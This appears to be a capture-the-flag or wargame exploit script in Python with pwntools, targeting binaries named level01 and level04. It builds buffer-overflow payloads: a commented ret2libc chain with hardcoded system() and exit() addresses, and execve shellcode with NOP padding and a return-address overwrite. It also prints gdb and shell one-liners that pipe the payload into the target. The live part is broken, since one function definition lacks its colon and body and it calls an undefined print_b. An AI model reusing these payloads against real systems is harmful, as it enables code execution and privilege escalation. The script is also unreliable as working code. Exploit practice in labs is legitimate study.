#!/usr/bin/python3
# import binascii 
# from pwn import p32
# 
# start = p32(0xfffdd000)
# system_addr = p32(0xf7e6aed0)
# exit_addr = p32(0xf7e5eb70)
# 
# 
# data = b"/bin/sh\0"
# payload = (data).ljust(156, b'A')
# shellcode = system_addr + exit_addr + start
# shellcode = ''.join(r'\x'+hex(letter)[2:] for letter in shellcode)
# print(len(payload))
# 
# print("\n" + '*' * 80)
# gcc_string = b'run < <(printf "'
# print(repr(gcc_string + payload)[2:-1], end='')
# print((shellcode + '")'))
# 
# print()
# print("*" * 80)
# 
# print("python -c 'print(b\"", end="")
# print(repr(payload)[2:-1], end='')
# print((shellcode + '")\' | env -i PWD=/home/users/level04 SHELL=/bin/bash SHLVL=0 LINES=53 COLUMNS=211 /home/users/level04/level04'))
# 
# #run < <(printf "/bin/sh\x00AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xd0\xae\xe6\xf7\x60\xdd\xff\xff\x00\xd0\xfd\xff")
# 
# 
# 
# # bash_addr = p32(0xffffdf9d)
# # system_addr = p32(0xf7e6aed0)
# # exit_addr = p32(0xffffdd60)
# # padding = 156
# # shellcode = system_addr + exit_addr + bash_addr
# # #shellcode = b'\x90' * padding + p32(0xdeadbeef)
# #
# # #final = shellcode.rjust(padding, b'\x90')
# # print(len(shellcode))
# # print("A" * padding)


#!/usr/bin/python3
from binascii import hexlify
from pwn import *

def shellcode_to_string(shellcode, end=''):
    payload = ''.join(r'\x'+hex(letter)[2:] for letter in shellcode)
    payload = payload.replace('\\x0', '\\x00')
    return payload

def build_gdb_str(payload)
start = 0xffffdd60
data = b"/tmp/a\0"
shellcode = b"\xB8\x0B\x00\x00\x00\xBB\x60\xDD\xFF\xFF\x31\xC9\x89\xCA\xCD\x80"
payload = (data + shellcode).ljust(156, b'\x90')

shellcode_start = start + len(data)
path_start = start;
print(f"Check path:")
print(f"x /s {hex(path_start)}")
print("Check shellcode: ")
print(f"x /{len(shellcode)}i {hex(shellcode_start)}")

payload += p32(shellcode_start)

print("\n" + '*' * 80)
gcc_string = 'run < <(printf "'
print(gcc_string, end='')
print_b(payload)
print('")')
# print(repr(gcc_string + payload + b'")')[2:-1])
print()
print("python -c 'print(b\"dat_will\\n" + repr(payload)[2:-1] + "\")'" + " | env -i PWD=/home/users/level01 SHELL=\"/bin/bash\" SHLVL=0 /home/users/level01/level01")
